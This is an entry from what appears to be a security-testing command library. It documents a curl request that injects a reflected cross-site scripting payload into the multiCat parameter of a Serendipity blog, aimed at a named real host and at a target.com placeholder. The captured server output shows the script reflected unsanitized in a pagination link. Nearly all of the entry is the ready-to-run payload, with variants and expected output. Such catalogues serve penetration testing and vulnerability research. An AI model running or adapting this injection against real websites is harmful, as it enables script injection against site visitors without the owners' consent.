---
id: cmd-uuid-1
data: >-
  curl -s --data
  "serendipity%5BisMultiCat%5d=Go%21&serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25<%20><ScRiPt%20>prompt(1)</ScRiPt>"
  "https://blog.fuzzing-project.org/index.php?frontpage"
tags:
  - xss
  - injection
  - http
type: command
output: >-
  <li class="next"><a
  href="https://blog.fuzzing-project.org/categories/1\'\"()&%< ><ScRiPt
  >prompt(1)</ScRiPt>-multi/P2.html">next page &rarr;</a></li>
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.296Z'
verified: false
validated: true
submitted: true
---
# curl-xss-payload-injection

## Command

```bash
curl -s --data "serendipity%5BisMultiCat%5d=Go%21&serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25<%20><ScRiPt%20>prompt(1)</ScRiPt>" "https://blog.fuzzing-project.org/index.php?frontpage"
```

## Description

This command sends a POST request to a Serendipity endpoint with a URL-encoded XSS payload in the multiCat parameter to test for reflected script injection in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter and error messages | Yes |
| `--data` | Specifies the URL-encoded POST data with payload | Yes |
| URL | Target endpoint for the request | Yes |

## Examples

### Basic Usage

```bash
curl -s --data "serendipity%5BisMultiCat%5d=Go%21&serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25<%20><ScRiPt%20>prompt(1)</ScRiPt>" "https://target.com/index.php?frontpage"
```

### Advanced Usage

```bash
curl -s --data "serendipity%5BisMultiCat%5d=Go%21&serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25<%20><ScRiPt%20>prompt(1)</ScRiPt>" "https://target.com/index.php?frontpage" -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

The full HTML response from the server, including the reflected payload in the pagination link, such as an <a> tag with unsanitized script.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-Serendipity-multiCat]]
